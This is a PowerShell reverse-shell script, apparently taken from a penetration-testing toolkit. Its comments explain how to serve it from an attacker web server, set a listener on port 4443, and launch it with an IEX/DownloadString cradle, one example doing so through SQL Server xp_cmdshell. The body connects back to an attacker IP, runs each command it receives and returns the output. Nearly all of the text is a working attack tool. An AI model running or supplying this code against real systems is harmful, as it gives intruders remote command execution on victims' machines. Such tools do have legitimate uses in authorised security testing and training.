# Must be hosting file 'shell.ps1' from attack machine web server, e.g. python3 -m http.server 8080
# Set listener to port 4443
#
# Run command: "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<attack_machine>/pwrshell_revrse-shell.ps1\");"
# Examples:
# SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3:8080/pwrshell_revrse-shell.ps1\");"
# C:\> powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3:8080/pwrshell_revrse-shell.ps1\");

$client = New-Object System.Net.Sockets.TCPClient("<attack_machine_ip>",4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
